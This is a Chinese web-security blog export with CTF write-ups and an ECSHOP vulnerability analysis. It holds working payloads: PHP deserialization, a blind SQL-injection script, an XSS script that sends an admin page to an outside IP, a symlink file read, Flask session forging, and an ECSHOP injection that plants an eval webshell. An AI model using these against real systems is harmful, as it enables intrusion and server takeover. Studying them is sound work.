{"meta":{"title":"技术改变世界，文化改变人心","subtitle":"一个专注于web安全的web狗","description":null,"author":"flight","url":"http://yoursite.com"},"pages":[{"title":"关于我","date":"2018-07-25T02:02:28.000Z","updated":"2018-07-26T14:36:42.501Z","comments":true,"path":"whoami/index.html","permalink":"http://yoursite.com/whoami/index.html","excerpt":"","text":"专注于web安全，热爱一切美的东西，喜欢音乐，喜欢吉他，喜欢尝试新的东西，在计算机这条深不见底的洞里面越走越远，估计是脱不了坑了 身边有一堆大佬朋友还是很靠谱的，给一些各位神的链接"},{"title":"links","date":"2018-07-26T14:57:21.000Z","updated":"2018-08-05T09:05:12.558Z","comments":true,"path":"links/index.html","permalink":"http://yoursite.com/links/index.html","excerpt":"","text":"double-r’s blog pupil’s blog qiqi’s blog quincy’s blog void0red’s blog koocola’s blog 欣佬’s blog"}],"posts":[{"title":"实例化漏洞和XXE","slug":"2019 全国信息安全竞赛","date":"2019-04-21T14:11:24.103Z","updated":"2019-04-22T02:01:56.621Z","comments":true,"path":"2019/04/21/2019 全国信息安全竞赛/","link":"","permalink":"http://yoursite.com/2019/04/21/2019 全国信息安全竞赛/","excerpt":"","text":"2019 全国信息安全竞赛##JustSoso 发现注释有文件包含，包含获得源码 123456789101112131415161718192021222324252627282930// index.php&lt;html&gt;&lt;?phperror_reporting(0); $file = $_GET[\"file\"]; $payload = $_GET[\"payload\"];if(!isset($file))&#123; echo 'Missing parameter'.'&lt;br&gt;';&#125;if(preg_match(\"/flag/\",$file))&#123; die('hack attacked!!!');&#125;@include($file);if(isset($payload))&#123; $url = parse_url($_SERVER['REQUEST_URI']); parse_str($url['query'],$query); foreach($query as $value)&#123; if (preg_match(\"/flag/\",$value)) &#123; die('stop hacking!'); exit(); &#125; &#125; $payload = unserialize($payload);&#125;else&#123; echo \"Missing parameters\"; &#125; ?&gt;&lt;!--Please test index.php?file=xxx.php --&gt;&lt;!--Please get the source of hint.php--&gt;&lt;/html&gt; 123456789101112131415161718192021222324252627282930313233343536373839// hint.php&lt;?php class Handle&#123; private $handle; public function __wakeup()&#123; foreach(get_object_vars($this) as $k =&gt; $v) &#123; $this-&gt;$k = null; &#125; echo \"Waking up\\n\"; &#125; public function __construct($handle) &#123; $this-&gt;handle = $handle; &#125; public function __destruct()&#123; $this-&gt;handle-&gt;getFlag(); &#125;&#125;class Flag&#123; public $file; public $token; public $token_flag; function __construct($file)&#123; $this-&gt;file = $file; $this-&gt;token_flag = $this-&gt;token = md5(rand(1,10000)); &#125; public function getFlag()&#123; $this-&gt;token_flag = md5(rand(1,10000)); if($this-&gt;token === $this-&gt;token_flag) &#123; if(isset($this-&gt;file))&#123; echo @highlight_file($this-&gt;file,true); &#125; &#125; &#125;&#125;?&gt; 可以看到，我们不能直接读取flag 思路很清晰，我们通过unserilize来反序列化Handle类，在Handle类的handle为Flag的时候在destruct的时候，就可以调用到getFlag，我们可以构造hint.php中的类来做到文件读取 现在我们有点需要通过： 在index.php中限制了反序列化的字符串中不能有flag字段 在反序列化的时候会调用__wakeup方法，这个方法会将我们的handle属性覆盖为null 在调用getFlag的时候，我们的token_flag必须和$this-&gt;token_flag相同 我们可以一个一个绕过： 看到题目的取参数方式和平常很不一样，联想是否有什么问题，发现parse_url函数在处理：http://xxxx////a.php这种多个斜杠的url的时候会返回null，第一步可以绕过 __wakup方法还是很好绕过的，当属性的真实个数与序列化的个数不一样的时候，最后调用的时候不会调用__wakeup方法 在反序列化的时候可以用&amp;符号来做一个指针，可以自动让$token_flag相等 最后的payload： 1http://3d5764f77e4549b981f0c73c2efbce6c9c54d98170394cbd.changame.ichunqiu.com//////?file=hint.php&amp;payload=O%3A6%3A%22Handle%22%3A2%3A%7Bs%3A14%3A%22%00Handle%00handle%22%3BO%3A4%3A%22Flag%22%3A3%3A%7Bs%3A4%3A%22file%22%3Bs%3A8%3A%22flag.php%22%3Bs%3A5%3A%22token%22%3Bs%3A32%3A%228cb22bdd0b7ba1ab13d742e22eed8da2%22%3Bs%3A10%3A%22token_flag%22%3BR%3A4%3B%7D%7D 全宇宙最简单的SQL题目给的很清楚，SQL注入，但是有个很大的问题是，只有两种显示状态，语句报错或者是登陆失败 过滤了or，让我们对password和mysql表和字段的判断有了一定阻碍 如何让一条语句判断为真的时候不报错，为假的时候报错，反之也可以 如何获得字段名，表名，以及在查询的时候，password如何代替 思路： mysql的and语句在前面的语句正确的时候才进行后面语句的判断，否则只判断前面的语句是否正确。还有一个mysql的特性，在mysql计算过大的数的时候会报错，所以我们可以通过报错和不报错来判断前面的条件是否成立，所以我们可以构造如下payload：username=admin&#39; and 1=2 and (select 2*1e308)#&amp;password=admin，即可成功构造条件判断 因为or被过滤，所以无法用直接的方式来查询出来password的值，但是我们可以用别名来查询password，请看下面的演示： 所以我们可以通过这种方式来进行注入，所以最后的payload： username=admin&#39; and ascii(substr((select a.2 from (select 1,2 from user union select * from user limit 0,1)a),1,1))=90 and (select 2*1e308)#&amp;password=admin 因为是盲注，编写一个脚本 123456789101112131415import requestsurl = 'http://39.97.167.120:52105/'result = ''for i in range (1,26): for j in range(33,126): payload = &#123; 'username' : \"admin' and ascii(substr((select a.2 from (select 1,2 from user union select * from user limit 1,1)a),&#123;&#125;,1))=&#123;&#125; and (select 2*1e308)#\".format(i,j), 'password' : \"admin\" &#125; res = requests.post(url=url, data=payload) if len(res.content) &gt;= 1307: result = result + chr(j) print result 最后注入出来密码为：F1AG@1s-at_/fll1llag_h3r3（表名是猜的23333） 登陆后的界面为： 一看到这里，超级简单了，伪造mysql数据库，读取文件 在服务器上起一个伪造的mysql：我们的文件在/fll1llag_h3r3 选择一个存在的表，其他的随便输： 即可在服务器端收到flag： love the math这道题只能说：f1sh tql calc.php直接有源码： 12345678910111213141516171819202122232425262728&lt;?php error_reporting(0); //听说你很喜欢数学，不知道你是否爱它胜过爱flag if(!isset($_GET['c']))&#123; show_source(__FILE__); &#125;else&#123; //例子 c=20-1 $content = $_GET['c']; if (strlen($content) &gt;= 80) &#123; die(\"太长了不会算\"); &#125; $blacklist = [' ', '\\t', '\\r', '\\n','\\'', '\"', '`', '\\[', '\\]']; foreach ($blacklist as $blackitem) &#123; if (preg_match('/' . $blackitem . '/m', $content)) &#123; die(\"请不要输入奇奇怪怪的字符\"); &#125; &#125; //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh']; preg_match_all('/[a-zA-Z_\\x7f-\\xff][a-zA-Z_0-9\\x7f-\\xff]*/', $content, $used_funcs); foreach ($used_funcs[0] as $func) &#123; if (!in_array($func, $whitelist)) &#123; die(\"请不要输入奇奇怪怪的函数\"); &#125; &#125; //帮你算出答案 eval('echo '.$content.';'); &#125; 发现都是些数学函数，过滤非常狠： 不允许有任何的非白名单的函数或者变量存在 构造的字符串长度不能超过79位 如果想要构造函数，我们的$content必须要是一个字符串，所以翻一翻php手册，这些数学函数中返回的是字符串的只有：base_convert, decbin, dechex, decoct 而base_convert有个很有意思的typical usage： 可以看到，我们可以通过base_convert来转换为字符串，所以可以构造： 12345&lt;?phpecho base_convert('system',36,10);echo \"&lt;br&gt;\";echo base_convert('ls', 36, 10);?&gt; 得到对应的10进制数字： 可以直接在服务器上转换，成功执行命令：http://6290bf1796b844a68f29a4d31e166f506a77bf71fd4d4ef8.changame.ichunqiu.com/calc.php?c=base_convert(1751504350,10,36)(base_convert(784,10,36)) 但是接下来想要读取flag，被长度限制的快怀疑人生了。。。。。。 直接看f1sh的payload吧：(base_convert(371235972282,10,28))(${decoct(531)^base_convert(68631,20,35)}{1})&amp;1=flag.php base_convert(371235972282,10,28)：readfile decoct(531)^base_convert(68631,20,35)：_GET（fuzz出来的） 所以最后的payload解码以后就是：(readfile{$_GET{1}}) 自己写了一个小的fuzz脚本，如果以后需要fuzz字符的话可以直接改： 12345678910111213&lt;?php$str1 = '_GET';$sets = ['0','1','2','3','4','5','6','7','8','9','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z'];for($i=0;$i&lt;count($sets);$i++)&#123; for($j=$i;$j&lt;count($sets);$j++)&#123; $content = $sets[$i]^$sets[$j]; $name = \"$sets[$i] : $sets[$j]\\r\\n\"; file_put_contents('xor.txt',$name,FILE_APPEND); file_put_contents('xor.txt',\"$content\\r\\n\",FILE_APPEND); file_put_contents('xor.txt',\"\\r\\n\"); &#125;&#125;","categories":[],"tags":[{"name":"漏洞分析","slug":"漏洞分析","permalink":"http://yoursite.com/tags/漏洞分析/"},{"name":"安全技术","slug":"安全技术","permalink":"http://yoursite.com/tags/安全技术/"}]},{"title":"HCTF 2018 share复盘","slug":"HCTF 2018 share复盘","date":"2019-03-27T09:54:07.875Z","updated":"2019-03-27T09:54:58.115Z","comments":true,"path":"2019/03/27/HCTF 2018 share复盘/","link":"","permalink":"http://yoursite.com/2019/03/27/HCTF 2018 share复盘/","excerpt":"","text":"HCTF 2018 share复盘解题流程 上来发现功能点很少，只有一个Share to admin可以使用，一般来说这种都是XSS 扫描目录发现robots.txt存在，发现部分源码 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859/* this terrible code */class FileController &lt; ApplicationController before_action :authenticate_user! before_action :authenticate_role before_action :authenticate_admin protect_from_forgery :except =&gt; [:upload , :share_people_test]# post /file/upload def upload if(params[:file][:myfile] != nil &amp;&amp; params[:file][:myfile] != \"\") file = params[:file][:myfile] name = Base64.decode64(file.original_filename) ext = name.split('.')[-1] if ext == name || ext ==nil ext=\"\" end share = Tempfile.new(name.split('.'+ext)[0],Rails.root.to_s+\"/public/upload\") share.write(Base64.decode64(file.read)) share.close File.rename(share.path,share.path+\".\"+ext) tmp = Sharefile.new tmp.public = 0 tmp.path = share.path tmp.name = name tmp.tempname= share.path.split('/')[-1]+\".\"+ext tmp.context = params[:file][:context] tmp.save end redirect_to root_path end# post /file/Alpha_test def Alpha_test if(params[:fid] != \"\" &amp;&amp; params[:uid] != \"\" &amp;&amp; params[:fid] != nil &amp;&amp; params[:uid] != nil) fid = params[:fid].to_i uid = params[:uid].to_i if(fid &gt; 0 &amp;&amp; uid &gt; 0) if(Sharelist.find_by(sharefile_id: fid)==nil) if(Sharelist.count(\"user_id = ?\", uid.to_s) &lt;5) share = Sharelist.new share.sharefile_id = fid share.user_id = uid share.save end end end end redirect_to(root_path) end def share_file_to_all file = Sharefile.find(params[:fid]) File.rename(file.path,Rails.root+\"/public/download/\"+file.name) file.public = true file.path = Rails.root+\"/public/download/\"+file.name file.save endend 这些路由都需要管理员的登录，所以我们还是需要XSS，随便写一个&lt;script src=&quot;http://vps/a.js&quot;，可以发现服务器请求了我们的vps，证明可以利用，但是在cookie是httponly，所以无法直接读取 现在思路很清楚，通过csrf来获取管理员的页面，所以我们构建payload 12345678910111213141516171819202122var xmlhttp; if (window.XMLHttpRequest) &#123; xmlhttp=new XMLHttpRequest(); &#125; else &#123; xmlhttp=new ActiveXObject(\"Microsoft.XMLHTTP\"); &#125; xmlhttp.onreadystatechange=function() &#123; if (xmlhttp.readyState==4 &amp;&amp; xmlhttp.status==200) &#123; result=xmlhttp.responseText; result=encodeURI(result); xmlhttp.open(\"POST\",\"http://120.77.152.169:2340/\",true); xmlhttp.setRequestHeader(\"Content-type\",\"application/x-www-form-urlencoded\"); xmlhttp.send(\"aaa=\"+result); &#125; &#125; xmlhttp.open(\"GET\",\"http://localhost:2000/home/upload\",true); xmlhttp.send(); 可以读取到admin的界面代码 根据hint1和hint2给出的代码和目录结构，我们可以大致整理出来思路 1234567891011121314151617181920212223242526272829hint1:views|-- devise| |-- confirmations| |-- mailer| |-- passwords| |-- registrations| | `-- new.html.erb| |-- sessions| | `-- new.html.erb| |-- shared| `-- unlocks|-- file|-- home| |-- Alphatest.erb| |-- addtest.erb| |-- home.erb| |-- index.html.erb| |-- publiclist.erb| |-- share.erb| `-- upload.erb|-- layouts| |-- application.html.erb| |-- mailer.html.erb| `-- mailer.text.erb`-- recommend `-- show.erbhint2:&lt;%= render template: &quot;home/&quot;+params[:page] %&gt; 在hint2中，我们可以包含home目录下面的模版文件，但是不能够进行目录穿越 题目的模版文件在home目录下 share = Tempfile.new(name.split(‘.’+ext)[0],Rails.root.to_s+”/public/upload”)，在之前ruby的一个CVE中 可以看到上面上传的时候就是用了这个库，所以我们可以将我们上传的文件上传到home下面，然后渲染它 构建文件上传的js： 123456789101112131415161718192021222324$.get(\"http://localhost:2000/home/upload\",function(data)&#123; var token=data.substr(data.indexOf('name=\"authenticity_token\" value=\"')+33,88); var formData = new FormData(); formData.append(\"authenticity_token\", token); formData.append(\"file[context]\", \"zxcvxzcvxzcv\"); var content = 'PCU9IGBjYXQgL2ZsYWcgYCAlPg=='; //这是文件内容的base64 var blob = new Blob([content], &#123; type: \"image/png\"&#125;); formData.append(\"file[myfile]\", blob,\"Ly4uLy4uL2FwcC92aWV3cy9ob21lL2FhMzguZXJi\"); //这里是文件名的base64 formData.append(\"commit\", 'submit'); var request = new XMLHttpRequest(); request.open(\"POST\", \"http://localhost:2000/file/upload\"); request.send(formData); request.onreadystatechange=function() &#123; if (request.readyState==4) &#123; $.ajax(&#123;url:'http://120.77.152.169:2340/',type:'POST',data:&#123;'request_respone':request.response,'request_status':request.status&#125;,dataType:'jsonp',success:function(a)&#123;&#125;&#125;); &#125; &#125;&#125;); 执行成功后，我们可以看到我们的file数量多了1 但是文件是重命名过的，我们需要管理员把文件分享给我们，我们才能获取到文件名，所以我们需要构建一个post请求csrf来让管理员把文件分享给我们 之后可以在自己的账户下看到文件和文件名 之后我们可以用home下面的渲染来获得flag","categories":[],"tags":[{"name":"ctf,web","slug":"ctf-web","permalink":"http://yoursite.com/tags/ctf-web/"}]},{"title":"HCTF 2018 hide and seek复盘","slug":"HCTF 2018 hide and seek复盘","date":"2019-03-27T08:30:04.643Z","updated":"2019-03-27T08:31:14.474Z","comments":true,"path":"2019/03/27/HCTF 2018 hide and seek复盘/","link":"","permalink":"http://yoursite.com/2019/03/27/HCTF 2018 hide and seek复盘/","excerpt":"","text":"HCTF 2018 hide and seek复盘解题过程 发现admin无法登录，在用户名和密码随便输入以后，进入到可以上传zip文件的地方 看到zip文件上传，联想到软连接读取文件，所以构造payload 12ln -s /etc/passwd get.jpg压缩jpg文件，上传 uwsgi可以在/proc/self/environ中读取到flask应用的路径 1UWSGI_ORIGINAL_PROC_NAME=/usr/local/bin/uwsgiSUPERVISOR_GROUP_NAME=uwsgiHOSTNAME=de551d07df6dSHLVL=1PYTHON_PIP_VERSION=19.0.1HOME=/rootGPG_KEY=0D96DF4D4110E5C43FBFB17F2D347EA6AA65421DUWSGI_INI=/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.iniNGINX_MAX_UPLOAD=0UWSGI_PROCESSES=16STATIC_URL=/staticUWSGI_CHEAPER=2TERM=xtermNGINX_VERSION=1.15.8-1~stretchPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binNJS_VERSION=1.15.8.0.2.7-1~stretchLANG=C.UTF-8SUPERVISOR_ENABLED=1PYTHON_VERSION=3.6.8NGINX_WORKER_PROCESSES=autoSUPERVISOR_SERVER_URL=unix:///var/run/supervisor.sockSUPERVISOR_PROCESS_NAME=uwsgiLISTEN_PORT=80STATIC_INDEX=0PWD=/app/hard_t0_guess_n9f5a95b5ku9fgSTATIC_PATH=/app/staticPYTHONPATH=/appUWSGI_RELOADS=0 之后可以发现有配置文件/app/it_is_hard_t0_guess_the_path_but_y0u_find_it_5f9s5b5s9.ini 读取配置文件 1[uwsgi] module = hard_t0_guess_n9f5a95b5ku9fg.hard_t0_guess_also_df45v48ytj9_main callable=app 发现了flask的应用文件，所以读取hard_t0_guess_n9f5a95b5ku9fg.hard_t0_guess_also_df45v48ytj9_main.py 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687# -*- coding: utf-8 -*-from flask import Flask,session,render_template,redirect, url_for, escape, request,Responseimport uuidimport base64import randomfrom werkzeug.utils import secure_filenameimport osrandom.seed(uuid.getnode())app = Flask(__name__)app.config['SECRET_KEY'] = str(random.random()*100)app.config['UPLOAD_FOLDER'] = './uploads'app.config['MAX_CONTENT_LENGTH'] = 100 * 1024ALLOWED_EXTENSIONS = set(['zip'])flag = 'flag&#123;you_are_good&#125;'def allowed_file(filename): return '.' in filename and \\ filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS@app.route('/', methods=['GET'])def index(): error = request.args.get('error', '') if(error == '1'): session.pop('username', None) return render_template('index.html', forbidden=1) if 'username' in session: return render_template('index.html', user=session['username'], flag=flag) else: return render_template('index.html')@app.route('/login', methods=['POST'])def login(): username=request.form['username'] password=request.form['password'] if request.method == 'POST' and username != '' and password != '': if(username == 'admin'): return redirect(url_for('index',error=1)) session['username'] = username return redirect(url_for('index'))@app.route('/logout', methods=['GET'])def logout(): session.pop('username', None) return redirect(url_for('index'))@app.route('/upload', methods=['POST'])def upload_file(): if 'the_file' not in request.files: return redirect(url_for('index')) file = request.files['the_file'] if file.filename == '': return redirect(url_for('index')) if file and allowed_file(file.filename): filename = secure_filename(file.filename) file_save_path = os.path.join(app.config['UPLOAD_FOLDER'], filename) if(os.path.exists(file_save_path)): return 'This file already exists' file.save(file_save_path) else: return 'This file is not a zipfile' try: extract_path = file_save_path + '_' os.system('unzip -n ' + file_save_path + ' -d '+ extract_path) read_obj = os.popen('cat ' + extract_path + '/*') file = read_obj.read() read_obj.close() os.system('rm -rf ' + extract_path) except Exception as e: file = None os.remove(file_save_path) if(file != None): if(file.find(base64.b64decode('aGN0Zg==').decode('utf-8')) != -1): return redirect(url_for('index', error=1)) return Response(file)if __name__ == '__main__': #app.run(debug=True) app.run(host='127.0.0.1', debug=True, port=10008) 发现uuid.getnode()是获取的设备mac地址，所以我们可以读取本机的mac地址，文件地址为：/sys/class/net/eth0，mac地址值为：02:42:ac:11:00:05 而seed是mac地址的10进制，所以我们可以获得随机数的种子，而这个随机数是伪随机数 1234567import uuidimport randommac = uuid.getnode()random.seed(mac)randStr = str(random.random()*100)print randStr 可以运行后发现randStr = 60.1784037471，现在我们知道了key，就可以伪造admin的session了 伪造session为：eyJ1c2VybmFtZSI6ImFkbWluIn0.D3zEGw.d_B2Rg3BIDZEqpjeaWK8OMX9cN8，这个地方有个小坑，python2如果直接伪造的话，会发现伪造的session中成了b’admin’，必须把username前面加上u，让username变成unicode，才可以成功伪造 拿到flag 考点 软连接读文件 本地的文件：/proc/self/environ的内容，/sys/class/net/eth0 flask session可以伪造","categories":[],"tags":[{"name":"ctf,web","slug":"ctf-web","permalink":"http://yoursite.com/tags/ctf-web/"}]},{"title":"ECSHOP 漏洞分析","slug":"ECSHOP 漏洞分析","date":"2019-03-13T11:06:40.525Z","updated":"2019-03-13T11:08:11.054Z","comments":true,"path":"2019/03/13/ECSHOP 漏洞分析/","link":"","permalink":"http://yoursite.com/2019/03/13/ECSHOP 漏洞分析/","excerpt":"","text":"ECSHOP 漏洞分析全局过滤和防御ecshop的防御非常。。。。暴力，ecshop的结构并不是现在流行的MVC框架，它不是单入口模式的，所以有很多文件来表示对应的模块 全局过滤文件safe.php 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657&lt;?php$url_arr=array('xss'=&gt;\"\\\\=\\\\+\\\\/v(?:8|9|\\\\+|\\\\/)|\\\\%0acontent\\\\-(?:id|location|type|transfer\\\\-encoding)\",);$args_arr=array('xss'=&gt;\"[\\\\'\\\\\\\"\\\\;\\\\*\\\\&lt;\\\\&gt;].*\\\\bon[a-zA-Z]&#123;3,15&#125;[\\\\s\\\\r\\\\n\\\\v\\\\f]*\\\\=|\\\\b(?:expression)\\\\(|\\\\&lt;script[\\\\s\\\\\\\\\\\\/]|\\\\b(?:eval|alert|prompt|msgbox)\\\\s*\\\\(|url\\\\((?:\\\\#|data|javascript)\",'sql'=&gt;\"[^\\\\&#123;\\\\s]&#123;1&#125;(\\\\s|\\\\b)+(?:select\\\\b|update\\\\b|insert(?:(\\\\/\\\\*.*?\\\\*\\\\/)|(\\\\s)|(\\\\+))+into\\\\b).+?(?:from\\\\b|set\\\\b)|[^\\\\&#123;\\\\s]&#123;1&#125;(\\\\s|\\\\b)+(?:create|delete|drop|truncate|rename|desc)(?:(\\\\/\\\\*.*?\\\\*\\\\/)|(\\\\s)|(\\\\+))+(?:table\\\\b|from\\\\b|database\\\\b)|into(?:(\\\\/\\\\*.*?\\\\*\\\\/)|\\\\s|\\\\+)+(?:dump|out)file\\\\b|\\\\bsleep\\\\([\\\\s]*[\\\\d]+[\\\\s]*\\\\)|benchmark\\\\(([^\\\\,]*)\\\\,([^\\\\,]*)\\\\)|(?:declare|set|select)\\\\b.*@|union\\\\b.*(?:select|all)\\\\b|(?:select|update|insert|create|delete|drop|grant|truncate|rename|exec|desc|from|table|database|set|where)\\\\b.*(charset|ascii|bin|char|uncompress|concat|concat_ws|conv|export_set|hex|instr|left|load_file|locate|mid|sub|substring|oct|reverse|right|unhex)\\\\(|(?:master\\\\.\\\\.sysdatabases|msysaccessobjects|msysqueries|sysmodules|mysql\\\\.db|sys\\\\.database_name|information_schema\\\\.|sysobjects|sp_makewebtask|xp_cmdshell|sp_oamethod|sp_addextendedproc|sp_oacreate|xp_regread|sys\\\\.dbms_export_extension)\",'other'=&gt;\"\\\\.\\\\.[\\\\\\\\\\\\/].*\\\\%00([^0-9a-fA-F]|$)|%00[\\\\'\\\\\\\"\\\\.]\");if( !function_exists('filterData') )&#123;function filterData(&amp;$data,$type)&#123; $data and filterArray($data,$type);&#125;&#125;if( !function_exists('filterArray') )&#123;function filterArray(&amp;$data,$filterarr)&#123; foreach ($data as $key =&gt; $value) &#123; if( is_array($value) )&#123; filterArray($data[$key],$filterarr); &#125;else&#123; if( $key and in_array(strtolower($key), array('goods_id','product_id','cat_id','gid','pid','uid','site_id')))&#123; $value and $data[$key] = intval($value); &#125;elseif ($key and in_array(strtolower($key),array('order_num','advance','advance_freeze','point_freeze','point_history','point','score_rate','state','role_type','advance_total','advance_consume'))) &#123; unset($data[$key]); &#125; // elseif( $key and in_array($key, array('tax_company','comment','contact','forward')) )&#123; // $value and $data[$key] = htmltotxt($value); // &#125; elseif( $value )&#123; $data[$key] = filter($value,$filterarr); &#125; &#125; &#125;&#125;&#125;if( !function_exists('filter') )&#123;function filter($str,$filterarr)&#123; foreach($filterarr as $value) &#123; if (preg_match(\"/\".$value.\"/is\",$str)==1||preg_match(\"/\".$value.\"/is\",urlencode($str))==1) &#123; header(\"Content-type: text/html; charset=utf-8\"); print \"您的提交带有不合法参数,谢谢合作\"; exit(); &#125; &#125; return $str;&#125;&#125;$referer=empty($_SERVER['HTTP_REFERER']) ? array() : array($_SERVER['HTTP_REFERER']);$query_string=empty($_SERVER[\"QUERY_STRING\"]) ? array() : array($_SERVER[\"QUERY_STRING\"]);filterData($query_string,$url_arr);filterData($_GET,$args_arr);filterData($_POST,$args_arr);filterData($_COOKIE,$args_arr);filterData($referer,$args_arr);filterData($_SERVER,$args_arr); 可以看到，ecshop把不符合安全规则的参数全部都进行了waf，直接不允许请求，而且对$_GET,$_POST,$_COOKIE,$_SERVER全部对进行了过滤，在这种暴力的防御下，我们的思路就应该从GET,POST这些变量中稍微变动一下，基本这种全局waf是很难饶过的，那么我们可以去找一些url二次编码，或者base64解码的地方，这样才可以绕过这种全局waf 漏洞复现123GET /user.php?act=login HTTP/1.1Host: 127.0.0.1Referer: 45ea207d7a2b68c49582d2d22adf953aads|a:2:&#123;s:3:\"num\";s:72:\"0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -\";s:2:\"id\";i:1;&#125; 可以直接将poc提交，看一下结果 这里因为是mysql是5.7版本，而limit后procedure analyse的使用范围是：mysql5.x~5.6.6，所以procedure不能用，就不配了，但是漏洞已经可以显现了 SQL注入漏洞跟踪分析 第一步，程序获取了referer的值 而我们的构造不会被safe.php所拦截，所以这一步获取的就是我们完全可控的referer 第二步，程序将referer传递给了注册模版变量的assgin函数 我们跟入assign函数： 因为我们传入的参数是字符串，进入else分支，因为这里没有任何的过滤，我们成功将我们可控的referer的值注册成为了cls_template类的变量 之后程序调用了display，我们跟入display函数 现在的filename为：user_passport.dwt 获取到了user_passport.dwt的内容存入$out变量中 referer的值被插入到了$out中 之后比较$out和$this-&gt;_echash如果相等的话就进入if的条件中，而$this-&gt;_echash的值在最前面就已经定义了 将获取到的$out根据_echash进行分割，我们可以看到被分割为了这样的数组 因为是根据_echash进行分割的，所以我们需要referer的值中也有_echash的值，可以看到我们的payload现在变成了ads|a:2:{s:3:&quot;num&quot;;s:72:&quot;0,1 procedure analyse(extractvalue(rand(),concat(0x7e,version())),1)-- -&quot;;s:2:&quot;id&quot;;i:1;} 接下来将数组中奇数的部分作为参数调用insert_mod函数，跟入insert_mod函数 之后，将$name参数根据|进行分割，之后得到了$fun和$para 现在我们可以控制执行的函数和参数，但是这个函数必须是insert_xxx这种类型的参数，而作者成功找到了insert_ads这个函数来作为漏洞的利用函数，跟入insert_ads 1234567891011121314151617181920212223242526272829303132333435363738function insert_ads($arr)&#123; static $static_res = NULL;// $arr['num'] = intval($arr['num']);// $arr['id'] = intval($arr['id']); $time = gmtime(); if (!empty($arr['num']) &amp;&amp; $arr['num'] != 1) &#123; $sql = 'SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, ' . 'p.ad_height, p.position_style, RAND() AS rnd ' . 'FROM ' . $GLOBALS['ecs']-&gt;table('ad') . ' AS a '. 'LEFT JOIN ' . $GLOBALS['ecs']-&gt;table('ad_position') . ' AS p ON a.position_id = p.position_id ' . \"WHERE enabled = 1 AND start_time &lt;= '\" . $time . \"' AND end_time &gt;= '\" . $time . \"' \". \"AND a.position_id = '\" . $arr['id'] . \"' \" . 'ORDER BY rnd LIMIT ' . $arr['num']; $res = $GLOBALS['db']-&gt;GetAll($sql); &#125; else &#123; if ($static_res[$arr['id']] === NULL) &#123; $sql = 'SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, '. 'p.ad_height, p.position_style, RAND() AS rnd ' . 'FROM ' . $GLOBALS['ecs']-&gt;table('ad') . ' AS a '. 'LEFT JOIN ' . $GLOBALS['ecs']-&gt;table('ad_position') . ' AS p ON a.position_id = p.position_id ' . \"WHERE enabled = 1 AND a.position_id = '\" . $arr['id'] . \"' AND start_time &lt;= '\" . $time . \"' AND end_time &gt;= '\" . $time . \"' \" . 'ORDER BY rnd LIMIT 1'; $static_res[$arr['id']] = $GLOBALS['db']-&gt;GetAll($sql); &#125; $res = $static_res[$arr['id']]; &#125; $ads = array(); $position_style = ''; ...&#125; 传入的参数$arr为： 在SQL语句中： 1234567$sql = 'SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, ' . 'p.ad_height, p.position_style, RAND() AS rnd ' . 'FROM ' . $GLOBALS['ecs']-&gt;table('ad') . ' AS a '. 'LEFT JOIN ' . $GLOBALS['ecs']-&gt;table('ad_position') . ' AS p ON a.position_id = p.position_id ' . \"WHERE enabled = 1 AND start_time &lt;= '\" . $time . \"' AND end_time &gt;= '\" . $time . \"' \". \"AND a.position_id = '\" . $arr['id'] . \"' \" . 'ORDER BY rnd LIMIT ' . $arr['num']; 我们可以看到将$arr[&#39;num&#39;]的值直接拼接到了limit之后，在mysql允许procedure的时候就可以造成SQL注入 GETSHELL漏洞分析很多人认为到这里，SQL注入就是这个漏洞所能做到的一切了，但是，根据POC，这个漏洞从一个XSS到SQL注入，最终GETSHELL，我们现在分析GETSHELL的payload 123GET /user.php?act=login HTTP/1.1Host: 127.0.0.1Referer: 45ea207d7a2b68c49582d2d22adf953aads|a:2:&#123;s:3:\"num\";s:280:\"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275d3b617373657274286261736536345f6465636f646528275a6d6c735a56397764585266593239756447567564484d6f4a7a4575634768774a79776e50443977614841675a585a686243676b58314250553152624d544d7a4e3130704f79412f506963702729293b2f2f7d787878,10-- -\";s:2:\"id\";s:3:\"'/*\";&#125; 其中十六进制转为字符串之后的结果为： &#39;/* {$asd&#39;];assert(base64_decode(&#39;ZmlsZV9wdXRfY29udGVudHMoJzEucGhwJywnPD9waHAgZXZhbCgkX1BPU1RbMTMzN10pOyA/Picp&#39;));//}xxx 因为mysql对十六进制进行转为字符处理，所以我们的payload用十六进制转换后即可成功绕过ecshop的全局waf 在执行到insert_ads方法之后，查看SQL语句： 1SELECT a.ad_id, a.position_id, a.media_type, a.ad_link, a.ad_code, a.ad_name, p.ad_width, p.ad_height, p.position_style, RAND() AS rnd FROM `ecshop`.`ecs_ad` AS a LEFT JOIN `ecshop`.`ecs_ad_position` AS p ON a.position_id = p.position_id WHERE enabled = 1 AND start_time &lt;= '1552473239' AND end_time &gt;= '1552473239' AND a.position_id = ''/*' ORDER BY rnd LIMIT */ union select 